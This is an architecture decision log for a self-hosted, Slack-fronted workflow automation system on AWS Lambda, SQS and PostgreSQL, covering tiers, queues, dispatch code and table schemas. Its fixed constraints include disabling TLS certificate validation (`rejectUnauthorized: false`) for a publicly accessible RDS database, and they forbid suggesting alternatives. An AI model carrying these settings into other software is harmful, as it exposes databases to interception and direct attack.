# evolving-mind-ai — Architecture Decision Log
<!-- Copyright (c) 2026 Javea Guiri. All rights reserved. -->
<!-- Licensed under the GNU Affero General Public License v3.0 (AGPL-3.0). -->
<!-- See LICENSE file in the project root for full license terms. -->

Version: 3.2  
Status: Active development — Intent Preprocessor next  
Last updated: 2026-03-22 (session 5)

---

## 1. System Purpose

A self-evolving, low-cost cognitive automation brain that:
- Accepts natural language intent from users via Slack (or any UI)
- Uses LLM sparingly — only for novel intents, workflow generation, and schema creation
- Persists generated workflows in PostgreSQL and reuses them — LLM is not called twice for the same problem
- Evolves its own workflows and schemas over time
- Runs at approximately $8–$13/month at household scale — see Section 16 for full cost breakdown

---

## 2. Stack — Final, Do Not Change

| Component | Choice | Reason |
|---|---|---|
| Runtime | Node.js 22.x ESM | Modern, fast cold starts |
| Bundler | esbuild | Fast, ESM-native, handles CJS interop |
| Infrastructure | AWS SAM + CloudFormation | Declarative, reproducible |
| Compute | AWS Lambda (arm64 Graviton2) | ~20% cheaper than x86 |
| Queuing | AWS SQS (standard) | Async workflow execution |
| Database | PostgreSQL 16.6 on RDS | Config (PGC) + Domain (PGD) |
| UI | Slack Bot | Primary interface — abstracted, others can be added |
| LLM | Pluggable (currently Perplexity) | Model selection is coded logic |
| Region | us-east-2 | Fixed |
| API Base | https://enwwi5aulf.execute-api.us-east-2.amazonaws.com/Prod | Fixed |

### Architectural constraints — never suggest alternatives to these

- All Lambdas use shared `LambdaExecutionRole` with inline policies
- SSM dynamic references `{{resolve:ssm:...}}` in per-function Environment blocks only — Globals does NOT resolve them
- `pg` uses `ssl: { rejectUnauthorized: false }` — Lambda connects over public internet, no VPC
- RDS is `PubliclyAccessible: true` — no VPC on Lambda avoids $32/mo NAT Gateway
- All esbuild configs use Banner CJS shim for dynamic require compatibility
- `OutExtension: .js=.mjs` on all functions — Lambda loads as ESM
- JSON template files imported as static ES module imports — NOT read via `fs.readFile` at runtime (esbuild bundles them)
- PROC endpoint modules are transport-agnostic — never import AWS SDK or Slack SDK. Check `req.source` ('http' or 'sqs') only to determine response path. Business logic is identical for both transports.

---

## 3. Lambda Architecture — Four Functions

| Function | Name | Triggers | Tier | Owns |
|---|---|---|---|---|
| SlackbotFunction | `evolving-mind-ai-slackbot` | API Gateway | Experience | `/api/v1/ui/slack/{proxy+}` — Slack parsing, ACK, threading |
| ProcFunction | `evolving-mind-ai-proc` | API Gateway + SQS WorkflowQueue | Process | `/api/v1/proc/{proxy+}` — business logic, LLM, intent, workflow execution |
| ServFunction | `evolving-mind-ai-serv` | API Gateway | Service | `/api/v1/serv/{proxy+}` — DB CRUD, DDL, data access |
| SlackCallbackListenerFunction | `evolving-mind-ai-slack-callback-listener` | SQS CallbackResults | Experience | Posts threaded Slack replies |

**Note:** `ProcStepOrchestrator` (`SYSLMBOrchestrator`) is eliminated as a separate Lambda.
`ProcFunction` handles both HTTP requests (API Gateway) and async workflow messages (SQS WorkflowQueue)
via dual event triggers in `template.yaml`. `handler.mjs` detects the event type and routes accordingly:
```js
if (event.Records) → SQS dispatch path → processWorkflowMessage()
if (event.httpMethod) → HTTP dispatch path → switch(req.route)
```
This eliminates the Lambda-to-Lambda hop, reduces cold start surface, and keeps all
process-tier logic in one deployable unit.

### 3.1 Three-tier architecture — Mulesoft model

The system follows a strict three-tier separation inspired by Mulesoft's API-led connectivity.
The system is designed for household-scale private deployment — PII is segmented per instance,
not shared across users of a multi-tenant service.

**Experience tier** (`SlackbotFunction`, `SlackCallbackListenerFunction`)
- Owned by UI concerns — Slack parsing, ACK messages, thread formatting, Block Kit rendering
- Never contains business logic
- `SlackbotFunction` handles inbound HTTP — slash commands and `/interactive` button clicks
- `SlackCallbackListenerFunction` handles outbound — consumes `SYSSQSSlackResults` and posts
  threaded Slack replies. Routes on `callback.provider` so adding a new UI is one new `case`
- Today: Slack. Tomorrow: Teams, webhook, or any other UI — swap the experience layer only

**Process tier** (`ProcFunction`)
- Contains all business logic and the true value of the system
- Cloud-agnostic — no AWS SDK imports
- Calls SERV and LLM via HTTP fetch only (API Gateway URLs)
- Testable directly via curl without SQS or Slack
- Handles both HTTP (API Gateway) and async (SQS WorkflowQueue) event types
- All endpoints documented spec-first in `openapi.yaml`

**Service tier** (`ServFunction`)
- Interfaces external system touchpoints — PostgreSQL today
- If the database changes, only this layer is refactored
- No business logic — pure data access
- All endpoints documented in `openapi.yaml`

---

### 3.2 SQS Queue Architecture

Two SQS standard queues carry all async traffic in the system. Every queue has a
Dead Letter Queue (DLQ) with a 14-day retention period for debugging failed messages.

#### WorkflowQueue (`SYSSQSWorkflow`)

**Purpose:** The async backbone of the system. Carries all workflow execution messages
from the Experience tier to the Process tier, and human gate resume messages from
`/interactive` back to ProcFunction.

**Producers:**
- `SlackbotFunction` — enqueues on every slash command (`CREATE_DOMAIN`, `HELP`, future commands)
- `interactive.mjs` — enqueues `WORKFLOW_STEP / resume_gate` when user clicks a Block Kit button
- `ProcFunction` itself — re-enqueues `WORKFLOW_STEP / execute_top` to advance the execution stack
  (Step Processor pattern — one SQS message per stack frame)

**Consumer:** `ProcFunction` (SQS trigger, `BatchSize: 10`, `ReportBatchItemFailures`)

**Message types today:**

| type | action | Sent by | Handled by |
|---|---|---|---|
| `PING_SQS` | — | SlackbotFunction | proc/handler inline |
| `PING_E2E` | — | SlackbotFunction | proc/handler inline |
| `CREATE_DOMAIN` | — | SlackbotFunction | proc/create-domain.mjs |
| `HELP` | — | SlackbotFunction | proc/help.mjs |
| `WORKFLOW_STEP` | `resume_gate` | interactive.mjs | proc/help.mjs (temporary — see tech debt) |
| `WORKFLOW_STEP` | `execute_top` | ProcFunction | proc/run-workflow.mjs (Phase 2 item 5) |
| `WORKFLOW_STEP` | `cancel` | ProcFunction /shutdown | proc/run-workflow.mjs (Phase 2 item 2) |

**Design decisions:**
- `BatchSize: 10` — Lambda event source mapping setting. Up to 10 messages delivered
  per invocation as a cost optimisation. One SQS message per `workflowRunId` is always
  in flight — batching handles concurrent runs across different workflow runs, never
  parallel steps within a single run.
- `ReportBatchItemFailures` — only failed records return to queue. Successful records
  in the same batch are not reprocessed.
- Standard queue (not FIFO) — ordering within a workflow run is enforced by the
  execution stack in `PGC_WorkflowRun`, not by the queue.

#### SlackResultsQueue (`SYSSQSSlackResults`)

**Purpose:** Carries result and notification messages from ProcFunction back to the
Experience tier for posting to Slack. Decouples business logic from UI delivery —
PROC never calls Slack directly.

**Producer:** `ProcFunction` via `enqueueCallback()` in `src/shared/sqs-callback.mjs` —
the ONLY place `@aws-sdk/client-sqs` is imported in the Process tier.

**Message envelope:** Every message carries `callback: { provider, channel, threadId }` —
the provider-agnostic routing object that makes the UI layer swappable.

**Consumer:** `SlackCallbackListenerFunction` — Lambda event source mapping with `BatchSize: 1`.
Each invocation receives and processes exactly one message, posting one Slack reply per call.

**Message types today:**

| type | Posted by callback.mjs as |
|---|---|
| `PING_SQS_RESULT` | Plain text threaded reply |
| `PING_E2E_RESULT` | Plain text threaded reply with RDS version |
| `CREATE_DOMAIN_RESULT` | Plain text threaded reply with table list |
| `HELP_GATE` | Block Kit message with confirm/cancel buttons |
| `HELP_RESULT` | Plain text threaded reply |
| `SERV_NOTIFICATION` | Plain text threaded reply |

**Design decisions:**
- `BatchSize: 1` — one message per invocation keeps Slack post ordering clean
  and avoids hitting the Slack API rate limit under burst conditions.
- `callback.provider` routing — `routeCallback()` in `callback.mjs` switches on
  provider. Adding Teams or webhook support is one new `case` with no other changes.
- PROC never imports `@slack/web-api` — all Slack SDK code is isolated to
  `SlackCallbackListenerFunction` and `SlackbotFunction`.

#### DLQs

| Queue | DLQ Name | Retention | Action on message |
|---|---|---|---|
| WorkflowQueue | `SYSSQSWorkflowDLQ` | 14 days | Inspect via AWS Console — indicates ProcFunction crash or unhandled message type |
| SlackResultsQueue | `SYSSQSSlackResultsDLQ` | 14 days | Inspect — indicates Slack API failure or malformed callback payload |

Both DLQs have `maxReceiveCount: 3` — a message is moved to the DLQ after 3 failed
processing attempts.


### 3.3 Route dispatch pattern

```
ProcFunction handler.mjs
  if (event.Records)    → SQS path → processSqsBatch(event)
  if (event.httpMethod) → HTTP path:
      parseEvent() → normalised req
      segments = path.split('/').filter(Boolean)
      req.subRoute = segments.pop()
      req.route    = segments.pop()
      switch(req.route) → delegate to endpoint module

All other Lambda handlers follow the same HTTP dispatch pattern.
```

### 3.4 Directory structure and file partitioning rules


```
evolving-mind-ai/
├── src/
│   ├── ui/
│   │   └── slackbot/                 Experience tier — Slack only
│   │       ├── handler.mjs           Lambda entry point — HTTP dispatch only
│   │       ├── ping.mjs              /ping-api
│   │       ├── ping-sqs.mjs          /ping-sqs
│   │       ├── ping-llm.mjs          /ping-llm
│   │       ├── ping-e2e.mjs          /ping-e2e
│   │       ├── create-domain.mjs     /create-domain — ACK + SQS enqueue only
│   │       └── callback.mjs          SQS CallbackResults consumer — Slack reply
│   │
│   ├── proc/                         Process tier — business logic only
│   │   ├── handler.mjs               Lambda entry — HTTP + SQS dual dispatch
│   │   │                             Detects event.Records vs event.httpMethod
│   │   │                             NO AWS SDK imports
│   │   ├── ping-llm.mjs              /proc/ping-llm
│   │   ├── create-domain.mjs         /proc/create-domain — transport-agnostic
│   │   ├── design-domain.mjs         /proc/design-domain — LLM call, no DB writes
│   │   ├── run-workflow.mjs          /proc/run-workflow — Step Processor entry point
│   │   ├── step-executor.mjs         Step type handlers — llm_call, human_gate, serv_schema, etc.
│   │   ├── template-resolver.mjs     Resolves {{key.path}} against local_state
│   │   ├── classify-intent.mjs       /proc/classify-intent
│   │   ├── delete-domain.mjs         /proc/delete-domain — drops PGD tables + registry
│   │   ├── shutdown.mjs              /proc/shutdown
│   │   ├── migrations/               One-time DB seed scripts — run manually
│   │   │   └── seed-*.mjs
│   │   └── scaffolds/                Phase 2b only — deleted when LLM takes over
│   │       └── recipes.json
│   │
│   ├── serv/                         Service tier — DB access only
│   │   ├── handler.mjs               Lambda entry — HTTP dispatch only
│   │   ├── ping-db.mjs               /serv/ping-db
│   │   ├── schema.mjs                /serv/schema/* — DDL
│   │   ├── table.mjs                 /serv/table/* — DML
│   │   ├── init-brain.mjs            Bootstrap — PGC table creation + seeding
│   │   └── templates/
│   │       └── pgc/                  JSON table definitions imported at build time
│   │           ├── PGC_Schema.json
│   │           ├── PGC_TableMap.json
│   │           └── ...
│   │
│   └── shared/                       Cross-cutting utilities — no business logic
│       ├── lambda-utils.mjs          parseEvent, ok, err — used by all Lambda handlers
│       └── sqs-callback.mjs          enqueueCallback() — ONLY place @aws-sdk/client-sqs
│                                     lives in ProcFunction
│
├── docs/
│   └── architecture.md
├── template.yaml                     SAM/CloudFormation — infrastructure only
├── samconfig.toml
├── package.json
└── .samignore
```

### 3.5 File partitioning rules — where does new code go?

**Experience tier (`src/ui/`):**
- Slack command parsing, ACK messages, thread formatting
- SQS enqueueing to WorkflowQueue (fire and forget — no business logic)
- Slack callback posting (`callback.mjs`)
- `@aws-sdk/client-sqs` and `@slack/web-api` are allowed here
- Never contains business logic or DB calls

**Process tier (`src/proc/`):**
- All business logic — LLM calls, workflow orchestration, intent classification
- Every endpoint module is transport-agnostic:
  - No `@aws-sdk/*` imports in endpoint modules
  - No `@slack/*` imports in endpoint modules
  - Use `fetch()` for all external calls (SERV, LLM)
  - Check `req.source` only to determine response path
- `handler.mjs` is the only file in proc that handles SQS event structure
- `enqueueCallback()` from `src/shared/sqs-callback.mjs` is how proc sends results back

**Service tier (`src/serv/`):**
- PostgreSQL access only — `pg` client is allowed here
- No business logic — pure data access and DDL
- No LLM calls, no SQS, no Slack
- `init-brain.mjs` is the only file allowed to create tables or seed rows at bootstrap

**Shared (`src/shared/`):**
- Pure utilities with no business logic and no tier-specific imports
- `lambda-utils.mjs` — `parseEvent`, `ok`, `err`, `buildReqFromSqs`
- `sqs-callback.mjs` — `enqueueCallback()` — the ONLY place `@aws-sdk/client-sqs`
  is imported in `ProcFunction`. Isolated here so endpoint modules stay AWS-agnostic.
- `llm-client.mjs` — `callLlm()`, `callLlmWithCorrection()` — shared LLM caller
- `serv-client.mjs` — `servPost()`, `getRows()`, `insertRow()`, `updateRows()` — shared SERV HTTP client

### 3.5a Inter-module call rules — FINAL

These rules govern how modules call each other. They are final and must not be violated.

| Call direction | Mechanism | Reason |
|---|---|---|
| exp → exp | Direct import | Same Lambda, same tier |
| proc → proc | Direct import | Same Lambda, same tier |
| serv → serv | Direct import | Same Lambda, same tier |
| any → shared | Direct import | Shared utilities, available to all |
| exp → proc | HTTP fetch to API Gateway | Cross-tier — keeps PROC independently testable |
| proc → serv | HTTP fetch to API Gateway | Cross-tier — keeps SERV independently swappable |
| SQS → proc | `buildReqFromSqs()` normalisation in `handler.mjs` | Async cross-tier delivery |
| proc → exp | Never | PROC never calls EXP — results go via SQS callback |
| serv → proc/exp | Never | SERV is the bottom tier — no upward calls |

**Why exp→proc and proc→serv go through HTTP fetch:**
If PROC and SERV were in the same Lambda, direct imports would be fine.
Because they are separate Lambdas, HTTP fetch through API Gateway is the only
transport-agnostic option that keeps PROC testable via curl without AWS infrastructure.

**`req.callback` vs `req.body.callback` — critical SQS pattern:**

`buildReqFromSqs()` destructures the SQS message envelope explicitly:
```js
const { type, traceId, callback, ...rest } = message;
return { ..., body: rest, callback: callback ?? null, traceId, ... };
```

This means `callback` is always at `req.callback` — **never** at `req.body.callback`.
`req.body` contains only the remaining fields after `type`, `traceId`, and `callback`
are lifted out. Every PROC endpoint that reads callback from an SQS message must use:
```js
const callback = req.callback ?? req.body?.callback ?? null;
```
The `req.body?.callback` fallback handles HTTP test calls that include callback in the
request body directly. Without this pattern, callback will be `undefined` on the SQS
path and the SlackCallbackListenerFunction will receive `provider: undefined`.

**When adding a new PROC endpoint:**
1. Create `src/proc/<endpoint-name>.mjs` — export `handle(req)`
2. Add `case '<endpoint-name>': return handle(req)` to HTTP switch in `handler.mjs`
3. Add `case '<SQS_MESSAGE_TYPE>': return handle(buildReq(message))` to SQS switch
4. Document in `openapi.yaml` spec-first
5. Never import AWS SDK in the endpoint module
6. Read callback as `req.callback ?? req.body?.callback ?? null` — never `req.body.callback`


### 3.6 Transport-agnostic endpoint pattern — IMPORTANT

`ProcFunction` endpoint modules are called identically whether the request
arrived via HTTP (API Gateway) or SQS (WorkflowQueue). This is the core of
the Mulesoft process tier principle — business logic is transport-agnostic.

**How it works:**

`handler.mjs` detects the event source and routes accordingly:

```js
// ProcFunction handler.mjs entry point
export async function handler(event) {
  if (event.Records) {
    return processSqsBatch(event.Records);   // SQS WorkflowQueue trigger
  }
  return processHttpRequest(event);          // API Gateway trigger
}
```

`processSqsBatch` iterates the SQS batch, calls `buildReqFromSqs` on each record
to produce the same normalised `req` object that `parseEvent` produces from HTTP
events, then dispatches to the same endpoint modules. Batch failures are collected
and returned in `batchItemFailures` so only failed records return to the queue.

```js
async function processSqsBatch(records) {
  const failures = [];
  for (const record of records) {
    try {
      const message = JSON.parse(record.body);
      const req     = buildReqFromSqs(message);   // normalise — same shape as HTTP req
      await dispatch(req);                         // same switch as HTTP path
    } catch (err) {
      console.error('proc: SQS record failed', { messageId: record.messageId, err });
      failures.push({ itemIdentifier: record.messageId });
    }
  }
  return { batchItemFailures: failures };
}
```

The endpoint module receives identical input either way:

```js
// HTTP delivery
POST /api/v1/proc/create-domain  { userInput: 'stock portfolio' }
  → parseEvent(event)
  → req = { route: 'create-domain', body: { userInput }, source: 'http', traceId, ... }
  → dispatch(req) → createDomain(req)

// SQS delivery
{ type: 'CREATE_DOMAIN', userInput: 'stock portfolio', callback: {...}, traceId: '...' }
  → processSqsBatch([record])
  → buildReqFromSqs(message)
  → req = { route: 'create-domain', body: { userInput }, source: 'sqs', callback, traceId, ... }
  → dispatch(req) → createDomain(req)
```

The endpoint function `createDomain(req)` never imports AWS SDK or Slack SDK.
It contains only business logic and HTTP fetch calls to SERV and LLM.

**The one difference — response path:**

The endpoint checks `req.source` to determine how to deliver results:

```js
// src/proc/create-domain.mjs
export async function handle(req) {
  const result = await doWork(req.body);

  if (req.source === 'http') {
    return ok(result, req.traceId);          // JSON response to API Gateway caller
  }

  // SQS — enqueue result to CallbackResults for SlackCallbackListenerFunction
  await enqueueCallback(req.callback, {
    type:    'CREATE_DOMAIN_RESULT',
    result,
    traceId: req.traceId,
  });
  // Return empty batchItemFailures — processSqsBatch collects this as success
  return { batchItemFailures: [] };
}
```

This pattern means every PROC endpoint is:
- **Directly testable via curl** — no SQS, no Slack required
- **Callable from Slack** — via SQS async path
- **Cloud-agnostic** — no AWS SDK in the endpoint module itself
- **Single source of truth** — one function, two transports, identical business logic

---

## 4. Data Architecture

### 4.1 One PostgreSQL Instances, two login URLs

| Login URL | Purpose | Primary Use |
|---|---|---|
| PGC | Config / system tables | PGC_* tables — system metadata, workflow definitions, prompts |
| PGD | Domain / user data | PGD_* tables — user-created domain tables |

### 4.2 Naming Conventions and Bootstrap

**Naming:**
- System config tables: `PGC_*` (live in PGC database)
- User domain tables: `PGD_*` (live in PGD database)
- Table names are mixed case and MUST be quoted in SQL: `"PGC_Schema"`

**Bootstrap — `init-brain.mjs`**

On every Lambda cold start, `bootstrap()` runs and is idempotent:
1. Install `set_updated_at()` trigger function on PGC
2. `CREATE TABLE IF NOT EXISTS` for all PGC system tables (from imported JSON templates)
3. Seed self-referential rows into `PGC_Schema` (`ON CONFLICT DO NOTHING`)
4. Seed gatekeeper rows into `PGC_TableMap` (`ON CONFLICT DO NOTHING`)
5. Seed `PGC_Prompt` rows for system workflows (`ON CONFLICT DO NOTHING`)
6. Seed `PGC_Workflow` rows for system workflows (`ON CONFLICT DO NOTHING`)
7. Seed `PGC_IntentMap` rows (`ON CONFLICT DO NOTHING`)
8. Set `bootstrapComplete = true` — skipped on warm containers

Bootstrap template files live in `src/serv/templates/pgc/` and are imported as ES module
static imports — NOT read via `fs.readFile` at runtime.

### 4.3 PGC System Tables
#### 4.3.1 PGC Schema Registry Tables
##### PGC_Schema
Registry of ALL table definitions — both system (PGC) and user domain (PGD).
Every table in the system has a row here including the system tables themselves (self-referential).

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| table_name | text UNIQUE | Quoted in SQL |
| target | text | `pgc` or `pgd` |
| domain | text | ✦ Domain this table belongs to — e.g. `recipes`, `stock_portfolio`. NULL for system tables |
| description | text | |
| columns | jsonb | Array of ColumnDefinition |
| foreign_keys | jsonb | Array of ForeignKeyDefinition |
| constraints | jsonb | Array of ConstraintDefinition |
| triggers | jsonb | Array of TriggerDefinition |
| created_at | timestamptz | |
| updated_at | timestamptz | Auto-updated by trigger |

##### PGC_TableMap
SERV-Table security gatekeeper. SERV-Table rejects writes to any table not registered here.

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| table_name | text UNIQUE | |
| target | text | `pgc` or `pgd` |
| domain | text | ✦ Mirrors `PGC_Schema.domain` — denormalised for gatekeeper queries without join |
| schema_id | integer FK | → PGC_Schema.id, ON DELETE RESTRICT |
| allow_insert | boolean | Default true |
| allow_update | boolean | Default true |
| allow_delete | boolean | Default false |
| views | jsonb | SQL view definitions |
| created_at | timestamptz | |
| updated_at | timestamptz | |

##### PGC_EntitySchema
Defines business entities that span multiple PGD tables.
SERV-Entity reads this to build `jsonb_agg` queries and execute entity-level DML.
Populated at runtime by `/create-domain`. Empty on fresh bootstrap.

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| entity_name | text UNIQUE | e.g. "Recipe" |
| description | text | |
| root_table | text | Primary PGD table for the entity — e.g. `PGD_Recipes` |
| joins | jsonb | Array of EntityJoin — related tables to LEFT/INNER JOIN for read operations |
| aggregations | jsonb | Array of EntityAggregation — jsonb_agg columns to assemble in read results |
| filters | jsonb | Default row-level filters always applied to this entity |
| upsert_key | jsonb | ✦ Array of column names forming the natural unique key — e.g. `["ticker"]`. Empty array means upsert not supported. Must match an existing UNIQUE constraint on root_table |
| created_at | timestamptz | |
| updated_at | timestamptz | Auto-updated by trigger |

##### PGC_DomainHelp
User-facing command aliases and help text per domain.
Powers `/help {domain}` responses. Populated at runtime by PROC when a domain is created.

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| domain | text UNIQUE | e.g. "recipes" |
| aliases | jsonb | e.g. ["recipe", "cooking"] |
| description | text | |
| commands | jsonb | Array of command definitions with examples |
| created_at | timestamptz | |
| updated_at | timestamptz | |

---

#### 4.3.2 PGC Workflow Tables

These six tables support the PROC layer workflow execution engine.

##### PGC_Workflow
Stores reusable workflow definitions generated by LLM or created manually.

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| name | text UNIQUE | e.g. `deduct_inventory` |
| domain | text | Domain this workflow belongs to. NULL for system/cross-domain workflows |
| description | text | |
| intent_keywords | jsonb | For coded intent matching |
| intent_embedding | vector | For pgvector similarity matching (future) |
| steps | jsonb | Array of StepDefinition (see Section 6.2) |
| state_strategy | text | `fire_and_forget`, `sequential`, `sequential_with_confirmation` |
| confirmation_required_at | jsonb | Step indices requiring human gate |
| js_extensions | jsonb | Optional sandboxed JS for complex steps (Option C) |
| model_used | text | Which LLM generated this workflow |
| quality_score | numeric | Human or auto-rated |
| max_execution_ms | integer | Guard 2 ceiling. NULL = use system default from PGC_SystemContext `guardrail_defaults` |
| max_steps_per_window | integer | Guard 1 threshold. NULL = use system default |
| window_seconds | integer | Guard 1 window duration. NULL = use system default |
| version | integer | |
| parent_workflow_id | integer FK | Self-referential — workflow evolution history |
| created_at | timestamptz | |
| updated_at | timestamptz | |

##### PGC_WorkflowRun
One row per workflow execution. Holds the execution stack, accumulated state,
callback routing, and runtime safety counters.

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| workflow_id | integer FK | → PGC_Workflow.id |
| trace_id | text | Correlation ID carried end-to-end from Slack message through all hops. Replaces `workflowId` in SQS payloads |
| triggered_by | text | `slack`, `api`, `workflow`, `system` — who initiated this run |
| status | text | `pending`, `running`, `awaiting_confirmation`, `awaiting_human_gate`, `completed`, `failed`, `cancelled` |
| input | jsonb | Original user intent + parameters |
| stack | jsonb | Execution stack — array of FrameDefinition (see Section 6.3). Controls frame flow only |
| state | jsonb | Accumulated cross-step data bag. Steps write `output_key` values here; subsequent steps read from here. Copied to `output` at run completion |
| output | jsonb | Final workflow output — copied from `state` at completion |
| callback | jsonb | Provider-agnostic UI callback — `{ provider, channel, threadId }` |
| total_execution_ms | integer | Running sum of all step `duration_ms` values. Incremented in same UPDATE as stack write. Used by Guard 2 |
| step_count | integer | Total steps executed this run. Incremented in same UPDATE as stack write |
| steps_in_window | integer | Steps executed since last `human_gate` completion. Reset to 0 when a human_gate step completes. Used by Guard 1 |
| window_started_at | timestamptz | Timestamp when current velocity window started. Reset with `steps_in_window`. Used by Guard 1 |
| error | jsonb | Last error details |
| started_at | timestamptz | |
| completed_at | timestamptz | |
| created_at | timestamptz | |
| updated_at | timestamptz | |

##### PGC_WorkflowRunStep
Append-only audit log — one row per step execution attempt. Never updated after insert.
Used for idempotency checks on SQS redelivery and debugging.

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| run_id | integer FK | → PGC_WorkflowRun.id |
| frame_id | text | UUID of the frame that executed |
| step_number | integer | |
| step_type | text | |
| capability_key | text | → PGC_Capability.capability_key — which capability was exercised. NULL for built-in step types |
| status | text | `completed`, `failed`, `skipped` |
| retry_count | integer | Attempts before this final status. Default 0. Supports idempotency debugging |
| input_snapshot | jsonb | What was passed in |
| output_snapshot | jsonb | What came out |
| error | jsonb | Error details if failed |
| duration_ms | integer | |
| executed_at | timestamptz | |

##### PGC_Prompt
Stores LLM prompts with versioning and quality tracking for self-improvement.

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| intent_category | text | e.g. `create_domain`, `deduct_inventory` |
| prompt_text | text | Actual prompt sent to LLM |
| input_variables | jsonb | Variables this prompt expects — `[{ name, description, required }]`. Documents contract for prompt improvement |
| output_schema | jsonb | Expected JSON shape of the LLM response. Used to validate output and guard downstream steps |
| output_sample | jsonb | Representative successful output stored on first clean run. Used for regression checking when prompt is evolved |
| model | text | Which LLM was used |
| version | integer | |
| parent_prompt_id | integer FK | Self-referential — prompt evolution history |
| was_successful | boolean | |
| quality_score | numeric | |
| error_log | jsonb | Structured: `{ attempts: [{ at, error_type, error_message, llm_raw_output, recovery_action }] }` |
| created_at | timestamptz | |
| updated_at | timestamptz | |

##### PGC_IntentMap
Maps user input patterns to workflows or action types for the Intent Preprocessor.

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| pattern | text | Regex or keyword pattern |
| intent_category | text | |
| workflow_id | integer FK | → PGC_Workflow.id (nullable — some intents are ad-hoc) |
| action_type | text | `crud`, `workflow`, `heavy_lift` |
| created_at | timestamptz | |
| updated_at | timestamptz | |

##### PGC_WorkflowRunLock
Reserved for future parallel execution — optimistic locking. NOT used in sequential mode.

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| run_id | integer FK UNIQUE | → PGC_WorkflowRun.id, CASCADE |
| locked_by | text | Lambda request ID |
| locked_at | timestamptz | |
| version | integer | Incremented on every stack update |
| created_at | timestamptz | |
| updated_at | timestamptz | |

---

#### 4.3.3 PGC Intelligence Tables — LLM Runtime Context

These three tables exist solely to make the LLM effective at runtime.
They are injected into heavy-lift prompts by PROC before calling the LLM.
None of them affect workflow execution — they are read-only from the execution
engine's perspective.

##### PGC_SystemContext
Compact runtime self-description of the system. Injected into every heavy-lift LLM
prompt so the model knows what it is operating inside, what it can do, and what the
rules are. Replaces `architecture.md` at runtime. Seeded on bootstrap.

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| key | text UNIQUE | Logical name — e.g. `system_overview`, `naming_conventions`, `allowed_column_types`, `serv_endpoints`, `guardrail_defaults` |
| section | text | Groups related keys — e.g. `architecture`, `rules`, `endpoints`, `schema` |
| content | text | The actual context text — plain prose or compact JSON. Injected verbatim into prompts |
| format | text | `prose` or `json` — tells the prompt builder how to format this block |
| inject_always | boolean | If true, always injected into heavy-lift prompts regardless of intent. Default false |
| inject_for | jsonb | Array of `intent_category` values this context is injected for. NULL = use `inject_always` only |
| version | integer | Incremented when content is updated by LLM or operator |
| created_at | timestamptz | |
| updated_at | timestamptz | |

**Bootstrap seed rows:**

| key | section | format | inject_always | content summary |
|---|---|---|---|---|
| `system_overview` | `architecture` | `prose` | true | What this system is and how it works |
| `naming_conventions` | `rules` | `prose` | true | PGC_/PGD_ prefixes, quoting rules, snake_case domains |
| `allowed_column_types` | `rules` | `json` | false | Whitelist of valid column types for createTable |
| `serv_endpoints` | `endpoints` | `json` | false | All SERV endpoints with request/response shapes |
| `sqs_message_format` | `schema` | `json` | false | SQS message envelope — type, traceId, callback, action |
| `guardrail_defaults` | `rules` | `json` | true | `{ "max_steps_per_window": 20, "window_seconds": 10, "max_execution_ms": 300000, "extension_minutes": 5 }` |

##### PGC_StepType
Canonical catalogue of all valid workflow step types with their input/output contracts.
Seeded on bootstrap. Injected into workflow generation and improvement prompts so the
LLM produces valid step definitions.

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| step_type | text UNIQUE | e.g. `serv_query`, `llm_call`, `human_gate`, `js_transform`, `notify`, `end` |
| description | text | Human and LLM readable explanation of what this step does |
| input_contract | jsonb | Required and optional fields — `[{ field, type, required, description }]` |
| output_contract | jsonb | Fields produced — `[{ field, type, description }]`. NULL for steps with no output (e.g. `notify`) |
| on_success_options | jsonb | Valid values for `on_success` — e.g. `["next", "end", "step:N"]` |
| on_failure_options | jsonb | Valid values for `on_failure` |
| requires_capability | text | → PGC_Capability.capability_key — NULL if always available |
| status | text | `live`, `planned`, `deprecated` |
| created_at | timestamptz | |
| updated_at | timestamptz | |

##### PGC_Capability
Registry of what this system can currently do. Injected into heavy-lift prompts so the
LLM proposes only feasible workflows and gives honest answers when asked for something
not yet supported.

| Column | Type | Notes |
|---|---|---|
| id | serial PK | |
| capability_key | text UNIQUE | e.g. `serv_table_insert`, `slack_notify`, `llm_agent_call`, `human_gate`, `js_transform` |
| category | text | `serv`, `notify`, `llm`, `ui`, `execution` |
| description | text | What this capability does — LLM readable |
| status | text | `live`, `planned`, `not_supported` |
| available_in | jsonb | Which Lambda functions expose this — e.g. `["proc", "serv"]` |
| notes | text | Constraints, limits, or caveats — e.g. `"js_transform requires security gate approval"` |
| created_at | timestamptz | |
| updated_at | timestamptz | |

---

#### 4.3.4 PGC_WorkflowStats — SQL View

Not a physical table. Queried by PROC only when building LLM prompts for workflow
evaluation or improvement. Not on the execution hot path — guards operate on
`PGC_WorkflowRun` columns updated in-transaction with the stack write.
Registered in `PGC_TableMap.views` on the `PGC_WorkflowRun` row.
```sql
CREATE OR REPLACE VIEW "PGC_WorkflowStats" AS
SELECT
  workflow_id,
  COUNT(*)                                             AS run_count,
  COUNT(*) FILTER (WHERE status = 'failed')            AS failure_count,
  COUNT(*) FILTER (WHERE status = 'completed')         AS success_count,
  COUNT(*) FILTER (WHERE status = 'cancelled')         AS cancelled_count,
  ROUND(
    COUNT(*) FILTER (WHERE status = 'failed')::numeric
    / NULLIF(COUNT(*), 0) * 100, 1
  )                                                    AS failure_rate_pct,
  MAX(created_at)                                      AS last_run_at,
  (ARRAY_AGG(status ORDER BY created_at DESC))[1]      AS last_status,
  AVG(total_execution_ms)
    FILTER (WHERE status = 'completed')                AS avg_execution_ms
FROM "PGC_WorkflowRun"
GROUP BY workflow_id;
```

---

#### 4.3.5 Updated PGC Table Count

| # | Table | Status |
|---|---|---|
| 1 | PGC_Schema | `domain` column added |
| 2 | PGC_TableMap | `domain` column added |
| 3 | PGC_EntitySchema | `upsert_key` column added |
| 4 | PGC_DomainHelp | unchanged |
